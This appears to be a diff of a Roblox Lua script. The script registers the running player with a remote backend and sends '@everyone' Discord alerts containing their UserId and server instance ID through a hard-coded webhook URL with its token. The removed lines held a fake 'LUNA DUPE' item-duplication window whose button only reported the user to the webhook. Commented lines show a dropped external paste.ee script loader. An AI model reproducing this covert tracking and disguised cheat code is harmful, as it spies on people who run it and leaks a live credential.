@@ -2,7 +2,6 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
 
 -- CONFIGURATION
 local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
@@ -10,23 +9,27 @@ local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
 local INSTANCE_URL = BACKEND_BASE_URL .. "/instance.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"
+-- local EXTERNAL_SCRIPT_URL = "https://paste.ee/r/kEHhQbpL" -- tidak dipakai lagi
 
 local REPORT_INTERVAL = 300 -- 5 minutes
 local DEBUG_MODE = true
 local MAX_RETRIES = 3
 local RETRY_DELAY = 2 -- seconds
 
+-- System variables
 local player = Players.LocalPlayer
 local currentInstanceId = game.JobId
 local isRunning = true
 
--- UTILITY FUNCTIONS
+-- ====================== [UTILITY FUNCTIONS] ======================
+
 local function log(message)
     if DEBUG_MODE then
         print("[Logger] " .. message)
     end
 end
 
+-- Retry wrapper untuk backend request
 local function makeBackendRequest(url, method, data)
     for attempt = 1, MAX_RETRIES do
         local success, response = pcall(function()
@@ -42,14 +45,21 @@ local function makeBackendRequest(url, method, data)
             })
         end)
 
-        if success and response.Success and response.StatusCode >= 200 and response.StatusCode < 300 then
+        if not success then
+            log(string.format("Attempt %d: Request failed (pcall error) to %s: %s", attempt, url, tostring(response)))
+        elseif response.Success and response.StatusCode >= 200 and response.StatusCode < 300 then
             return true
+        else
+            log(string.format("Attempt %d: Request failed (HTTP error) to %s: Status %d, Body: %s",
+                attempt, url, response.StatusCode, tostring(response.Body)))
         end
-        log(string.format("Attempt %d failed to %s", attempt, url))
+
         task.wait(RETRY_DELAY)
     end
     return false
 end
+
+-- ====================== [WEBHOOK VIA BACKEND PROXY] ======================
 
 local function sendToBackendProxy(contentOrPayload)
     if WEBHOOK_URL == "" then
@@ -58,10 +68,11 @@ local function sendToBackendProxy(contentOrPayload)
     end
 
     local payload = { url = WEBHOOK_URL }
+
     if type(contentOrPayload) == "string" then
         payload.content = contentOrPayload
     elseif type(contentOrPayload) == "table" then
-        for k,v in pairs(contentOrPayload) do
+        for k, v in pairs(contentOrPayload) do
             payload[k] = v
         end
     else
@@ -77,27 +88,36 @@ local function sendToBackendProxy(contentOrPayload)
         })
     end)
 
-    if success then
-        log("Webhook sent via proxy successfully")
-        return true
-    else
-        log("Failed to send webhook via proxy: " .. tostring(response))
+    if not success then
+        log("❌ Failed to send webhook via proxy: " .. tostring(response))
         return false
+    else
+        log("✅ Webhook sent via proxy successfully")
+        return true
     end
+end
+
+local function sendToWebhook(message)
+    return sendToBackendProxy("@everyone\n" .. message)
 end
 
 local function sendEnhancedWebhook(messageType, customMessage)
     local payload = {
         content = string.format("@everyone\n**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId)
     }
+
     if customMessage then
         payload.content = payload.content .. "\n" .. customMessage
     end
+
     local success = sendToBackendProxy(payload)
     if not success then
-        sendToBackendProxy(string.format("**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId))
+        log("❌ Simplified webhook via proxy failed, fallback to direct message")
+        sendToWebhook(string.format("**%s**\nUserId: %d\nInstanceId: %s", messageType, player.UserId, currentInstanceId))
     end
 end
+
+-- ====================== [DATABASE LOGGING] ======================
 
 local function registerPlayer()
     local data = {
@@ -122,10 +142,17 @@ local function updateInstanceStatus(status, extraData)
         timestamp = os.time()
     }
     if extraData then
-        for k,v in pairs(extraData) do data[k] = v end
+        for k, v in pairs(extraData) do
+            data[k] = v
+        end
     end
     return makeBackendRequest(INSTANCE_URL, "POST", data)
 end
+
+-- ====================== [SCRIPT MONITORING] ======================
+-- Fungsi executeExternalScript dihapus agar external script tidak dieksekusi
+
+-- ====================== [MAIN LOGIC] ======================
 
 local function periodicReporting()
     while isRunning do
@@ -146,8 +173,24 @@ local function initialize()
     end
 
     coroutine.wrap(periodicReporting)()
+
     updateInstanceStatus("script_started")
-    sendEnhancedWebhook("SCRIPT_STARTED", "Script initialized")
+    sendEnhancedWebhook("SCRIPT_STARTED", "External script execution skipped")
+
+    -- External script execution dihilangkan
+    -- local scriptSuccess = executeExternalScript()
+
+    -- if scriptSuccess then
+    --     updateInstanceStatus("script_completed")
+    --     sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
+    -- else
+    --     updateInstanceStatus("script_failed", { error = "External script execution failed" })
+    --     sendEnhancedWebhook("SCRIPT_FAILED", "Execution failed")
+    -- end
+
+    -- Ganti dengan status sukses langsung tanpa menjalankan external script
+    updateInstanceStatus("script_completed")
+    sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution skipped, no external script run")
 end
 
 local function shutdown()
@@ -156,7 +199,7 @@ local function shutdown()
     sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
 end
 
-UserInputService.InputEnded:Connect(function(input)
+UserInputService.InputEnded:Connect(function(input, processed)
     if input.KeyCode == Enum.KeyCode.End then
         shutdown()
     end
@@ -171,163 +214,5 @@ end)
 local success, err = pcall(initialize)
 if not success then
     updateInstanceStatus("initialization_failed", { error = tostring(err) })
-    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n" .. tostring(err))
+    sendEnhancedWebhook("INIT_FAILED", "Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
 end
-
--- GUI PART STARTS HERE
-
-pcall(function()
-    game.CoreGui:FindFirstChild("LUNA_DUPE"):Destroy()
-end)
-
-local gui = Instance.new("ScreenGui")
-gui.Name = "LUNA_DUPE"
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.ResetOnSpawn = false
-gui.Parent = game:GetService("CoreGui")
-
-local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
-local scaleFactor = isMobile and 0.7 or 1
-
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 350 * scaleFactor, 0, 320 * scaleFactor)
-mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
-mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
-mainFrame.BorderSizePixel = 0
-mainFrame.ClipsDescendants = true
-mainFrame.Name = "MainFrame"
-mainFrame.Parent = gui
-mainFrame.BackgroundTransparency = 1
-mainFrame.ZIndex = 10
-
-TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-    BackgroundTransparency = 0
-}):Play()
-
-local uicorner = Instance.new("UICorner", mainFrame)
-uicorner.CornerRadius = UDim.new(0, 12 * scaleFactor)
-
-local titleBar = Instance.new("Frame")
-titleBar.Size = UDim2.new(1, 0, 0, 35 * scaleFactor)
-titleBar.BackgroundColor3 = Color3.fromRGB(48, 48, 52)
-titleBar.Name = "TitleBar"
-titleBar.Parent = mainFrame
-titleBar.Active = true
-titleBar.Selectable = true
-
-local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -80 * scaleFactor, 1, 0)
-titleText.Position = UDim2.new(0, 10 * scaleFactor, 0, 0)
-titleText.BackgroundTransparency = 1
-titleText.Text = "🌙 LUNA DUPE (v3.2.4)"
-titleText.TextColor3 = Color3.fromRGB(230, 230, 230)
-titleText.TextSize = 16 * scaleFactor
-titleText.Font = Enum.Font.GothamBold
-titleText.TextXAlignment = Enum.TextXAlignment.Left
-titleText.Parent = titleBar
-
-local closeButton = Instance.new("TextButton")
-closeButton.Size = UDim2.new(0, 30 * scaleFactor, 0, 30 * scaleFactor)
-closeButton.Position = UDim2.new(1, -35 * scaleFactor, 0.5, 0)
-closeButton.AnchorPoint = Vector2.new(0, 0.5)
-closeButton.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
-closeButton.Text = "✕"
-closeButton.TextColor3 = Color3.new(1, 1, 1)
-closeButton.Font = Enum.Font.GothamBold
-closeButton.TextSize = 20 * scaleFactor
-closeButton.AutoButtonColor = true
-closeButton.Parent = titleBar
-
-closeButton.MouseButton1Click:Connect(function()
-    gui:Destroy()
-    shutdown()
-end)
-
-local infoLabel = Instance.new("TextLabel")
-infoLabel.Size = UDim2.new(1, -20 * scaleFactor, 0, 30 * scaleFactor)
-infoLabel.Position = UDim2.new(0, 10 * scaleFactor, 0, 45 * scaleFactor)
-infoLabel.BackgroundTransparency = 1
-infoLabel.Text = "Info: LUNA DUPE loaded. Press END key to stop logger."
-infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-infoLabel.TextSize = 14 * scaleFactor
-infoLabel.Font = Enum.Font.Gotham
-infoLabel.TextXAlignment = Enum.TextXAlignment.Left
-infoLabel.Parent = mainFrame
-
-local dupeButton = Instance.new("TextButton")
-dupeButton.Size = UDim2.new(1, -20 * scaleFactor, 0, 40 * scaleFactor)
-dupeButton.Position = UDim2.new(0, 10 * scaleFactor, 0, 90 * scaleFactor)
-dupeButton.BackgroundColor3 = Color3.fromRGB(80, 80, 85)
-dupeButton.Text = "DUPE"
-dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-dupeButton.Font = Enum.Font.GothamBold
-dupeButton.TextSize = 18 * scaleFactor
-dupeButton.Parent = mainFrame
-
--- This function replaces the external script execution with an internal stub
-local function performDupe()
-    -- You can expand this function to add actual dupe logic
-    -- For demo, just notify backend and send webhook
-
-    local backpack = player:FindFirstChild("Backpack")
-    if not backpack then
-        infoLabel.Text = "No backpack found to dupe items."
-        return
-    end
-
-    local itemsCount = 0
-    for _, item in ipairs(backpack:GetChildren()) do
-        itemsCount = itemsCount + 1
-    end
-
-    if itemsCount == 0 then
-        infoLabel.Text = "No items in backpack to dupe."
-        return
-    end
-
-    -- Example of reporting the dupe action
-    local dupeReport = string.format("Player %s (%d) performed DUPE with %d items in backpack at %s", player.Name, player.UserId, itemsCount, os.date())
-    sendEnhancedWebhook("DUPE_ACTION", dupeReport)
-    updateInstanceStatus("dupe_performed", { itemCount = itemsCount })
-
-    infoLabel.Text = "Dupe performed on " .. tostring(itemsCount) .. " items."
-    log("Dupe action logged.")
-end
-
-dupeButton.MouseButton1Click:Connect(function()
-    performDupe()
-end)
-
--- Draggable window support
-local dragging, dragInput, dragStart, startPos
-
-local function updatePosition(input)
-    local delta = input.Position - dragStart
-    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-end
-
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragStart = input.Position
-        startPos = mainFrame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-titleBar.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        dragInput = input
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        updatePosition(input)
-    end
-end)
